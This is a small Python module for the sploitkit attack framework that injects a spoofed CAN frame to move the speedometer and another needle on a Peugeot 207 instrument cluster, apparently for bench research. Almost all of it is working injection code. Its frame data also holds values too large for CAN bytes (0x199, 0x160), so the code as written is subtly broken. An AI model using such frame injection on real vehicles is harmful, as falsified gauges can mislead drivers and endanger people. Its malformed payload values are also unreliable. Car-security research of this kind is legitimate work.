from sploitkit import *
from pyvit import can
from pyvit.hw import socketcan

class peugeot207_ic_mover(Module):
    """ This module moves the needle of the accelorometer and speedometer the instrument cluster of a Peugeot 207.

    Author:  shipcod3
    Credits: mintynet (mentor and for giving me the Peugeot 207 instrument cluster)
    Version: 1.0
    """
    config = Config({
        Option(
            'INTERFACE',
            "CAN interface",
            True,
        ): str("vcan0"),
    })

    def run(self):
        dev = socketcan.SocketCanDev(self.config.option('INTERFACE').value)

        dev.start()
        print("[*] Moving the speedometer and accelorometer...")
        frame = can.Frame(0x0B6)
        frame.data = [0x199,0x00,0x160,0x00,0x00,0x00,0x00,0x00]
        dev.send(frame)
        pass
